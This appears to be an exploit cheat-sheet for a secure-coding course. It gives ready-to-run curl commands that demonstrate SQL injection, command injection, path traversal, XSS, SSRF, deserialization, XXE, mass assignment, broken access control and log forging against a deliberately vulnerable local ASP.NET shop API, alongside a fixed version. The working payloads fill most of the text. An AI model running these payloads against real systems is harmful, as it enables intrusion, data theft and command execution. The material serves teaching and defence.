# Exploit Cheat-Sheet

Ready-to-run commands for live demos. Start each app on its own terminal (no launch profile, pinned port):

```bash
ASPNETCORE_URLS=http://127.0.0.1:5101 dotnet run --project src/Vulnerable/Shop.Api --no-launch-profile
ASPNETCORE_URLS=http://127.0.0.1:5102 dotnet run --project src/Fixed/Shop.Api --no-launch-profile
```
`V=http://127.0.0.1:5101` `F=http://127.0.0.1:5102` (export these so the commands below work against either app).

## Day 1
**Ch1 — CWE-89 SQL injection**
```bash
curl -s "$V/products/search?q=Laptop"                              # normal: one row
curl -s "$V/products/search?q=zzz%25%27%20OR%201%3D1%20--"         # exploit: ALL rows
```
**Ch2 — CWE-915 mass assignment**
```bash
curl -s -X POST "$V/account/register" -H 'Content-Type: application/json' \
  -d '{"email":"mallory@x.com","password":"pw","isAdmin":true}'    # vuln: isAdmin=true honored
```
**Ch3 — CWE-22 path traversal**
```bash
curl -s "$V/invoices?name=../secret.txt"                           # vuln: reads the secret
```
**Ch4 — CWE-78 command injection** (POSIX)
```bash
curl -s "$V/reports/export?title=report%3B%20touch%20/tmp/scc-pwned-vuln.txt"   # vuln: runs touch
ls /tmp/scc-pwned-vuln.txt && rm /tmp/scc-pwned-vuln.txt
```
**Ch5 — CWE-79 output encoding**
```bash
curl -s -X POST "$V/reviews" -H 'Content-Type: application/json' \
  -d '{"productId":1,"author":"x","body":"<script>alert(1)</script>"}'
curl -s "$V/reviews/widget?productId=1"                            # vuln: raw <script> in HTML
```
**Ch6 — CWE-639 broken access control**
```bash
curl -s "$V/orders/1" -H 'X-User-Id: 2'                            # vuln: Bob reads Alice's order
curl -s -o /dev/null -w '%{http_code}\n' "$F/orders/1" -H 'X-User-Id: 2'   # fixed: 404
```

## Day 2
**Ch7 — CWE-327/916 crypto & hashing**
```bash
curl -s -X POST "$V/crypto/hash" -H 'Content-Type: application/json' -d '{"password":"hunter2"}'   # twice -> identical MD5
curl -s -X POST "$V/crypto/encrypt" -H 'Content-Type: application/json' -d '{"plaintext":"YELLOW_SUBMARINEYELLOW_SUBMARINE"}'  # ECB: repeating blocks
```
**Ch8 — CWE-330/338 insecure randomness**
```bash
curl -s "$V/account/reset-token"; echo; curl -s "$V/account/reset-token"   # vuln: identical token
```
**Ch9 — CWE-798 hardcoded secrets**
```bash
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$V/partner/webhook" -H 'X-Api-Key: sk_live_51HARDCODEDpartnerKEY'   # vuln: 200 with the source-visible key
```
**Ch10 — CWE-918 SSRF**
```bash
# Start a throwaway internal server first:  python3 -m http.server 9000
curl -s -X POST "$V/avatar/import" -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:9000/"}'   # vuln: fetches internal
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$F/avatar/import" -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:9000/"}'   # fixed: 400
```
**Ch11 — CWE-502/611 deserialization & XXE**
```bash
# JSON gadget (writes a sentinel file via $type):
curl -s -X POST "$V/import/json" -H 'Content-Type: application/json' \
  -d '{"$type":"dev.kaldiroglu.SecureCoding.Shop.Vulnerable.Domain.ImportGadget, dev.kaldiroglu.SecureCoding.Shop.Vulnerable","Trigger":"/tmp/scc-deser"}'
ls /tmp/scc-deser && rm /tmp/scc-deser
# XXE (reads a local file):
echo 'XXE-SECRET' > /tmp/scc-xxe.txt
curl -s -X POST "$V/import/xml" -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/scc-xxe.txt">]><foo>&xxe;</foo>'
```
**Ch12 — CWE-209 error exposure**
```bash
curl -s "$V/diagnostics/run"                                       # vuln: stack trace + connection string
curl -s "$F/diagnostics/run"                                       # fixed: generic ProblemDetails
```
**Ch13 — CWE-532 sensitive logging**
```bash
curl -s -X POST "$V/session/login" -H 'Content-Type: application/json' -d '{"username":"alice","password":"hunter2-SECRET"}'
# then show the password in the Vulnerable app's console log
```

## Cross-cutting
**Ch15 — CWE-20 input validation & sanitization**
```bash
# Exploit: negative quantity -> negative total (the store owes the attacker)
curl -s -X POST "$V/checkout" -H 'Content-Type: application/json' \
  -d '{"productId":1,"quantity":-5,"unitPrice":0.01,"note":"x"}'        # vuln: total < 0
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$F/checkout" -H 'Content-Type: application/json' \
  -d '{"productId":1,"quantity":-5,"unitPrice":0.01,"note":"x"}'        # fixed: 400
# Sanitization: full-width A + CRLF in the note
curl -s -X POST "$F/checkout" -H 'Content-Type: application/json' \
  -d '{"productId":1,"quantity":2,"unitPrice":10,"note":"Ａ\r\n  hi  there  "}'  # fixed: note -> "A hi there"
```

## Bonus
**Ch14 — CWE-117 log forging** (the `\n` in the JSON value becomes a real newline)
```bash
curl -s -X POST "$V/audit" -H 'Content-Type: application/json' \
  -d '{"action":"view\n2026-06-08 00:00:00 [WARN] user admin deleted all records"}'
# Vulnerable console: the forged line appears as its own log entry. Fixed ($F): collapsed onto one line.
```
